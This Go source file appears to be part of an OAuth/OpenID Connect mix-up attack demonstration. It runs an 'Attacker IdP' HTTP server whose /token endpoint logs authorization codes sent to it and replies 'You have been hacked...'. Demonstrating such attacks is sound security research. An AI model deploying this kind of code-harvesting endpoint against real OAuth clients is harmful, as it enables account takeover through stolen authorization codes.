package aidp

import (
	"log"
	"net/http"
)

// Config configures the aidp
type Config struct {
	Port   string
	HIdP   string
	Client string
}

var aidpConf Config

// StartAIdP starts the Attacker IdP
func StartAIdP(serverConf Config) {
	aidpConf = serverConf
	aidp := http.NewServeMux()

	aidp.HandleFunc("/token", handleToken)

	log.Println("Attacker IdP listening on port: " + serverConf.Port)
	http.ListenAndServe(":"+serverConf.Port, aidp)
}

func handleToken(rw http.ResponseWriter, req *http.Request) {
	log.Println("Got the token!")
	req.ParseForm()
	log.Println(req.Form.Get("code"))
	http.Error(rw, "You have been hacked...", http.StatusBadRequest)
}
